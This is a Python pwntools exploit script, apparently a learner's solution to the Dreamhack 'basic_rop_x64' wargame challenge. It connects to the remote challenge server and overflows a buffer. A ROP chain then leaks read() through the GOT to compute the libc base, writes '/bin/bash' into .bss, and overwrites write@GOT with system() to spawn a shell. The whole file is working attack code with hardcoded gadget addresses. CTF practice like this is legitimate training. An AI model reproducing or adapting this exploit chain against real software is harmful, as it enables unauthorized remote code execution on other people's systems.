
from os import lseek
from pwn import *

def slog(n,m):
    return success(":".join([n,hex(m)]))

def get_gadget(dict, code):
    for key, value in dict.items():
        if code == key:
            return slog(code, value)

# [0] settings
p = remote("host3.dreamhack.games", 11632)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
r = ROP(e)
context.arch = 'amd64'
context.log_level = 'debug'


# [1] Leak read GOT <- No, Get informations
# library func or get directly
read_plt = 0x4005f0     # elfsymbol
read_got = 0x601030
write_plt = 0x4005d0    # elfsymbol
write_got = 0x601020
# how can i get bss?
bss = 0x601070          # elfheader
# lib <=> read offset
read_offset = libc.symbols["read"]
slog("read_offset", read_offset)
# lib <=> system offset
system_offset = libc.symbols["system"]
slog("system_offset", system_offset)

# [2] get addresses of Code Gadget
# Code Gadget-> where can I get these?
'''
gadgets = r.gadget  #dictionary
print(gadgets)
get_gadget(gadgets, "pop rdi") #get address of pop_rdi
get_gadget(gadgets, "pop_r15") #get address of pop_r15
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_r15 = r.find_gadget(['pop rdi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]
'''
# get code_gadget using ROPgadget --binary [elf_name] | grep "string"
pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
ret = 0x4005a9
# buffer
buffer = b"A"*0x48  #buf(0x40) + SFP(0x8)


# [3] Exploit
# 3-1. find read() address : write(1, read_got, 16) <- syscall
payload = buffer + p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(16)
payload += p64(write_plt) #write(1, buf, sizeof(buf)) -> will print the buffer

# 3-2. find BSS. section address address : read(0, bss, 16) <- syscall
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(16)
payload += p64(read_plt) #input string in bss

# 3-3. overwrite GOT : read(0, write_got, 16) <- syscall
#payload2 = payload1
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(write_got)+ p64(16)
payload += p64(read_plt) #input system() address

# 3-4. call write -> system("/bin/sh")

# write(1, bss, 16) -> Not this.. Why??? :(
'''
payload2 += p64(pop_rdi) + p64(1)
payload2 += p64(pop_rsi_r15) + p64(bss) +p64(16)
payload2 += p64(write_plt)
'''
# -> write("/bin/sh") -> write(bss) -> ret
payload += p64(ret)
payload += p64(pop_rdi) + p64(bss) + p64(write_plt)

# [4] Send, Get shell
p.send(payload)

# 4-1. receive read() address, get offset, input "/bin/sh/\x00" in bss
p.recvuntil(b"A"*0x40) 
read = u64(p.recvn(6)+b"\x00"*2)  # IDK
slog("read address", read)

lib_addr = read - read_offset 
system = lib_addr + system_offset
slog("library address", lib_addr)
slog("system", system)
# 4-2. input string in bss section, input address of system()
# to read(0, bss, 8)
p.send(b"/bin/bash\x00")   # input string -> bss -> write_got
# to read(0, write_got, 16)
p.send(p64(system))  # input addres of system() 
# then wirte(bss) will run!

# 4-3. finish
p.interactive()
